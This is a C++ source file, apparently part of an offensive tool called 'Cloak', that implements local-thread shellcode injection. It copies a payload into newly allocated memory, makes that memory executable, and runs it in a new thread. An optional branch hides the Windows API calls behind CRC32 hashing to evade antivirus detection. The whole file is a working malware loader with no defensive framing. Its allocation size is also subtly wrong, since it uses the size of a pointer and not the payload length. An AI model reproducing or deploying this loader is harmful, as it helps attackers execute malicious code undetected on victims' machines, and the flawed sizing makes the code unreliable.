#include "Cloak.hpp"

#ifdef LOCAL_THREAD

#ifdef HASH_API
#include "Hash.hpp"

BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
    if ( pCreateThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnHeapFree pHeapFree = ( fnHeapFree ) GetProcAddressH( hKernel32, HeapFree_CRC32A );
    if ( pHeapFree == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for HeapFree\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetProcessHeap pGetProcessHeap = ( fnGetProcessHeap ) GetProcAddressH( hKernel32, GetProcessHeap_CRC32A );
    if ( pGetProcessHeap == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for GetProcessHeap\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;

    pPayloadAddress = pVirtualAlloc( NULL, sizeof( pbPayload ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] pVirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
    memset( pbPayload, '\0', sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] pVirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }
    
    hThread = pCreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) pPayloadAddress, NULL, NULL, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] pCreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    pWaitForSingleObject( hThread, WAIT_TIME );

    pHeapFree( pGetProcessHeap(), 0, pbPayload );

    return TRUE;
}

#else

BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;

    pPayloadAddress = VirtualAlloc( NULL, sizeof( pbPayload ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
    memset( pbPayload, '\0', sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    hThread = CreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) pPayloadAddress, NULL, NULL, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    WaitForSingleObject( hThread, WAIT_TIME );

    HeapFree( GetProcessHeap(), 0, pbPayload );

    return TRUE;
}

#endif // !HASH_API

#endif // !LOCAL_THREAD